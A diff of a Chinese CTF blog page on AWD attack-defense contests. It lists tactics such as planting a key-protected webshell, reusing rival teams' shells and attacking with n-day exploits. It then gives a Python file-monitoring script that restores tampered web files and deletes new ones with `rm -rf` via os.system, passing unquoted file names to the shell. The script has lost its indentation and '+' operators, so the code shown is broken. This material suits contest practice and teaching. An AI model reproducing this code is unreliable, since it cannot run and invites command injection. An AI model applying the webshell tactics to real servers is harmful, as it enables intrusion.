@@ -78,7 +78,7 @@ Canary = Canary's Blog</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">Symbols count in article</span>
-    <span>7.2k</span>
+    <span>8.9k</span>
     <span class="text">words</span>
   </span>
   <span class="item" title="Reading time">
@@ -86,7 +86,7 @@ Canary = Canary's Blog</title>
       <i class="ic i-clock"></i>
     </span>
     <span class="text">Reading time</span>
-    <span>7 mins.</span>
+    <span>8 mins.</span>
   </span>
 </div>
 
@@ -119,12 +119,12 @@ Canary = Canary's Blog</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/51227-projectSEKAI-KiritaniHaruka-PC-Wallpaper.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/54235-BanG_Dream-HikawaHina-PC-Wallpaper.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44761-imas-cinderella-MorikuboNono-PC.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/50380-IDOLY_PRIDE-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/46258-imoimo-PC-Wallpaper.jpg"></li>
           <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/Anihonetwallpaper18382.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/50410-OredakeHaireruKakushiDungeon-PC-Wallpaper.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/pic5.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/pic1.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/54236-BanG_Dream-ShirasagiChisato-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/51227-projectSEKAI-KiritaniHaruka-PC-Wallpaper.jpg"></li>
         </ul>
       </div>
     </header>
@@ -171,45 +171,228 @@ Canary = Canary's Blog</title>
     
 
     <ol>
-<li>给的是 ctf 低权限账号，但是中间件运行的是 www-data 权限，通常比 ctf 权限高，有些马用 ssh 上去删不掉，可以先传个自己的 shell 然后去删，当然得做一个防止被偷家的措施，比如说加一个 if ('xxx'===md5 (key)) 的操作。也可以用 www-data 去对文件和目录做权限的修改等操作。</li>
-<li>黑吃黑，直接用别的队伍上传的 shell。</li>
-<li>不是特别大型的比赛没有那么多的时间去审漏洞，通常用 nday 直接打，或者内置的 shell 后门。</li>
-<li>批量拿 flag 并自动提交平台；自动备份与恢复自己的靶机文件。网上找的确实不会用</li>
+<li>给的是ctf低权限账号，但是中间件运行的是www-data权限，通常比ctf权限高，有些马用ssh上去删不掉，可以先传个自己的shell然后去删，当然得做一个防止被偷家的措施，比如说加一个if (‘xxx’===md5(key))的操作。也可以用www-data去对文件和目录做权限的修改等操作。</li>
+<li>黑吃黑，直接用别的队伍上传的shell。</li>
+<li>不是特别大型的比赛没有那么多的时间去审漏洞，通常用nday直接打，或者内置的shell后门。</li>
+<li>批量拿flag并自动提交平台；自动备份与恢复自己的靶机文件。网上找的确实不会用</li>
 </ol>
-<h1 id="awd线下赛防守脚本"><a class="anchor" href="#awd线下赛防守脚本">#</a> AWD 线下赛防守脚本：</h1>
-<p>1. 该脚本基于 python，可直接在 linux 靶机上运行。</p>
-<p>2. 开局直接运行起来，会自动对 web 目录进行备份，并建立 hash 索引。当 web 目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。</p>
-<p>3. 无法避免的缺点：由于条件竞争，如果对方在我们删除 shell 之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。</p>
-<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span> utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span><span class="token comment">#</span></pre></td></tr><tr><td data-num="2"></td><td><pre>awd文件监控脚本</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> json</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">ListDir</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 获取网站所有文件</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">if</span> initialization<span class="token punctuation">[</span><span class="token string">'ok'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'false'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>dir_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>dir_list_tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>ListDir<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">if</span> initialization<span class="token punctuation">[</span><span class="token string">'ok'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'false'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>file_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>file_list_tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">def</span> <span class="token function">GetHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 获取 hash，建立索引</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">for</span> bak <span class="token keyword">in</span> file_list<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>bak<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>md5obj <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>md5obj<span class="token punctuation">.</span>update<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token builtin">hash</span> <span class="token operator">=</span> md5obj<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>bak_dict<span class="token punctuation">[</span>bak<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">hash</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'/tmp/awd_web_hash.txt'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'mkdir /tmp/awd_web_bak/'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'\\cp -a &#123;0&#125;* /tmp/awd_web_bak/'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>web_dir<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/awd_web_hash.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> <span class="token comment"># 记录 web 文件 hash</span></pre></td></tr><tr><td data-num="40"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>bak_dict<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> file_list<span class="token punctuation">:</span> <span class="token comment"># 记录 web 文件列表</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/awd_web_list.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> dir_list<span class="token punctuation">:</span> <span class="token comment"># 记录 web 目录列表</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/awd_web_dir.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token keyword">def</span> <span class="token function">FileMonitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 文件监控</span></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token comment"># 提取当前 web 目录状态</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre>initialization<span class="token punctuation">[</span><span class="token string">'ok'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'true'</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>web_dir<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="55"></td><td><pre>file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>web_dir<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>dir_list_tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>ListDir<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="60"></td><td><pre>file_list_tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list_tmp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>md5obj <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>md5obj<span class="token punctuation">.</span>update<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token builtin">hash</span> <span class="token operator">=</span> md5obj<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>bak_dict_tmp<span class="token punctuation">[</span><span class="token builtin">file</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">hash</span></pre></td></tr><tr><td data-num="67"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/awd_web_hash.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> <span class="token comment"># 读取备份的文件 hash</span></pre></td></tr><tr><td data-num="68"></td><td><pre>real_bak_dict <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/awd_web_list.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> <span class="token comment"># 读取备份的文件列表</span></pre></td></tr><tr><td data-num="70"></td><td><pre>real_file_list <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/awd_web_dir.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> <span class="token comment"># 读取备份的目录列表</span></pre></td></tr><tr><td data-num="72"></td><td><pre>real_dir_list <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token keyword">for</span> <span class="token builtin">dir</span> <span class="token keyword">in</span> real_dir_list<span class="token punctuation">:</span> <span class="token comment"># 恢复 web 目录</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="76"></td><td><pre>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[del-recover]dir:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="79"></td><td><pre><span class="token keyword">pass</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre><span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list_tmp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="82"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token keyword">if</span> real_bak_dict<span class="token punctuation">[</span><span class="token builtin">file</span><span class="token punctuation">]</span> <span class="token operator">!=</span> bak_dict_tmp<span class="token punctuation">[</span><span class="token builtin">file</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment"># 检测被篡改的文件，自动恢复</span></pre></td></tr><tr><td data-num="84"></td><td><pre>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'\\cp &#123;0&#125; &#123;1&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>web_dir<span class="token punctuation">,</span> <span class="token string">'/tmp/awd_web_bak/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[modify-recover]file:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre><span class="token keyword">except</span><span class="token punctuation">:</span> <span class="token comment"># 检测新增的文件，自动删除</span></pre></td></tr><tr><td data-num="87"></td><td><pre>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -rf &#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[delete]webshell:&#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="89"></td><td><pre></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token keyword">for</span> real_file <span class="token keyword">in</span> real_file_list<span class="token punctuation">:</span> <span class="token comment"># 检测被删除的文件，自动恢复</span></pre></td></tr><tr><td data-num="91"></td><td><pre><span class="token keyword">if</span> real_file <span class="token keyword">not</span> <span class="token keyword">in</span> file_list_tmp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="92"></td><td><pre>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'\\cp &#123;0&#125; &#123;1&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>real_file<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>web_dir<span class="token punctuation">,</span> <span class="token string">'/tmp/awd_web_bak/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> real_file<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[del-recover]file:&#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>real_file<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="94"></td><td><pre>file_list_tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="95"></td><td><pre>dir_list_tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="96"></td><td><pre></pre></td></tr><tr><td data-num="97"></td><td><pre></pre></td></tr><tr><td data-num="98"></td><td><pre>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="99"></td><td><pre>web_dir <span class="token operator">=</span> <span class="token string">'/var/www/'</span> <span class="token comment"># web 目录，注意最后要加斜杠</span></pre></td></tr><tr><td data-num="100"></td><td><pre>file_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="101"></td><td><pre>dir_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="102"></td><td><pre>bak_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>file_list_tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="104"></td><td><pre>dir_list_tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="105"></td><td><pre>bak_dict_tmp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="106"></td><td><pre>initialization <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'ok'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>ListDir<span class="token punctuation">(</span>web_dir<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="108"></td><td><pre>GetHash<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="109"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="110"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token string">' 安全'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="111"></td><td><pre>FileMonitor<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 监控间隔，按需修改</span></pre></td></tr></table></figure><h1 id="awd线下赛攻击脚本"><a class="anchor" href="#awd线下赛攻击脚本">#</a> AWD 线下赛攻击脚本：</h1>
-<p>（1）内存马 &amp; 自动获取刷新的 flag</p>
+<h1 id="AWD线下赛防守脚本："><a href="#AWD线下赛防守脚本：" class="headerlink" title="AWD线下赛防守脚本："></a>AWD线下赛防守脚本：</h1><p>1.该脚本基于python，可直接在linux靶机上运行。</p>
+<p>2.开局直接运行起来，会自动对web目录进行备份，并建立hash索引。当web目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。</p>
+<p>3.无法避免的缺点：由于条件竞争，如果对方在我们删除shell之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。</p>
+<pre><code class="python">-*- coding: utf-8 -*-#
+awd文件监控脚本
+
+import os
+import json
+import time
+import hashlib
+
+
+
+
+def ListDir(path): # 获取网站所有文件
+
+for file in os.listdir(path):
+file_path = os.path.join(path, file)
+if os.path.isdir(file_path):
+if initialization[&#39;ok&#39;] == &#39;false&#39;:
+dir_list.append(file_path)
+else:
+dir_list_tmp.append(file_path)
+ListDir(file_path)
+else:
+if initialization[&#39;ok&#39;] == &#39;false&#39;:
+file_list.append(file_path)
+else:
+file_list_tmp.append(file_path)
+
+
+def GetHash(): # 获取hash，建立索引
+for bak in file_list:
+with open(bak, &#39;rb&#39;) as f:
+md5obj = hashlib.md5()
+md5obj.update(f.read())
+hash = md5obj.hexdigest()
+bak_dict[bak] = hash
+if os.path.exists(&#39;/tmp/awd_web_hash.txt&#39;) == False:
+os.system(&#39;mkdir /tmp/awd_web_bak/&#39;)
+os.system(&#39;\\cp -a &#123;0&#125;* /tmp/awd_web_bak/&#39;.format(web_dir))
+with open(&#39;/tmp/awd_web_hash.txt&#39;, &#39;w&#39;) as f: # 记录web文件hash
+f.write(str(json.dumps(bak_dict)))
+for i in file_list: # 记录web文件列表
+with open(&#39;/tmp/awd_web_list.txt&#39;, &#39;a&#39;) as f:
+f.write(i &#39;\n&#39;)
+for i in dir_list: # 记录web目录列表
+with open(&#39;/tmp/awd_web_dir.txt&#39;, &#39;a&#39;) as f:
+f.write(i &#39;\n&#39;)
+
+
+def FileMonitor(): # 文件监控
+
+# 提取当前web目录状态
+
+initialization[&#39;ok&#39;] = &#39;true&#39;
+for file in os.listdir(web_dir):
+file_path = os.path.join(web_dir, file)
+if os.path.isdir(file_path):
+dir_list_tmp.append(file_path)
+ListDir(file_path)
+else:
+file_list_tmp.append(file_path)
+for file in file_list_tmp:
+with open(file, &#39;rb&#39;) as f:
+md5obj = hashlib.md5()
+md5obj.update(f.read())
+hash = md5obj.hexdigest()
+bak_dict_tmp[file] = hash
+with open(&#39;/tmp/awd_web_hash.txt&#39;, &#39;r&#39;) as f: # 读取备份的文件hash
+real_bak_dict = json.loads(f.read())
+with open(&#39;/tmp/awd_web_list.txt&#39;, &#39;r&#39;) as f: # 读取备份的文件列表
+real_file_list = f.read().split(&#39;\n&#39;)[0:-1]
+with open(&#39;/tmp/awd_web_dir.txt&#39;, &#39;r&#39;) as f: # 读取备份的目录列表
+real_dir_list = f.read().split(&#39;\n&#39;)[0:-1]
+
+for dir in real_dir_list: # 恢复web目录
+try:
+os.makedirs(dir)
+print(&#39;[del-recover]dir:&#123;&#125;&#39;.format(dir))
+except:
+pass
+
+for file in file_list_tmp:
+try:
+if real_bak_dict[file] != bak_dict_tmp[file]: # 检测被篡改的文件，自动恢复
+os.system(&#39;\\cp &#123;0&#125; &#123;1&#125;&#39;.format(file.replace(web_dir, &#39;/tmp/awd_web_bak/&#39;), file))
+print(&#39;[modify-recover]file:&#123;&#125;&#39;.format(file))
+except: # 检测新增的文件，自动删除
+os.system(&#39;rm -rf &#123;0&#125;&#39;.format(file))
+print(&#39;[delete]webshell:&#123;0&#125;&#39;.format(file))
+
+for real_file in real_file_list: # 检测被删除的文件，自动恢复
+if real_file not in file_list_tmp:
+os.system(&#39;\\cp &#123;0&#125; &#123;1&#125;&#39;.format(real_file.replace(web_dir, &#39;/tmp/awd_web_bak/&#39;), real_file))
+print(&#39;[del-recover]file:&#123;0&#125;&#39;.format(real_file))
+file_list_tmp[:] = []
+dir_list_tmp[:] = []
+
+
+os.system(&#39;rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/&#39;)
+web_dir = &#39;/var/www/&#39; # web目录，注意最后要加斜杠
+file_list = []
+dir_list = []
+bak_dict = &#123;&#125;
+file_list_tmp = []
+dir_list_tmp = []
+bak_dict_tmp = &#123;&#125;
+initialization = &#123;&#39;ok&#39;: &#39;false&#39;&#125;
